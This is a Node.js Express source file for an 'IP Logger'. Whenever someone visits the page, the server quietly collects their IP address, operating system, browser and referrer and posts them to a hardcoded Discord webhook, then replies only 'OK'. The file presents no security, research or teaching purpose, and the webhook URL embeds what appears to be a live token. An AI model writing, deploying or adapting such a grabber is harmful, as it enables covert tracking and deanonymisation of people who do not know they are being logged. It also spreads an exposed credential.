const express = require('express');
const axios = require('axios');
const cors = require('cors');
const useragent = require('express-useragent'); // Correct module for user-agent parsing

const app = express();
const PORT = process.env.PORT || 3000;

// Your Discord webhook (REPLACE THIS)
const webhookURL = "https://discord.com/api/webhooks/1342205786901839999/RnJ5qbDXmy22aeERWWBnuGQg1GR-SzDL4ouIxx1m7OL7cH1z1IOMRD3Gia1Qsnye2M4V";

// Middleware
app.use(cors());
app.use(useragent.express());

app.get('/', (req, res) => {
    // Extract IP
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";
    ip = ip.split(',')[0].replace('::ffff:', ''); // Clean format

    // Extract & parse user-agent info
    let ua = req.useragent || {};
    
    let deviceInfo = `
📌 **New Visitor**  
🌍 **IP Address:** ${ip}  
💻 **Device:** ${ua.platform || "Unknown"}  
📱 **OS:** ${ua.os || "Unknown"}  
🖥 **Browser:** ${ua.browser || "Unknown"}  
📡 **Referrer:** ${req.headers['referer'] || "Direct"}  
    `;

    // Send info to Discord
    axios.post(webhookURL, { content: deviceInfo })
        .then(() => console.log(`Logged: ${ip}`))
        .catch(err => console.error("Webhook error:", err.response?.data || err.message));

    res.send("OK");
});

app.listen(PORT, () => console.log(`IP Logger running on port ${PORT}`));
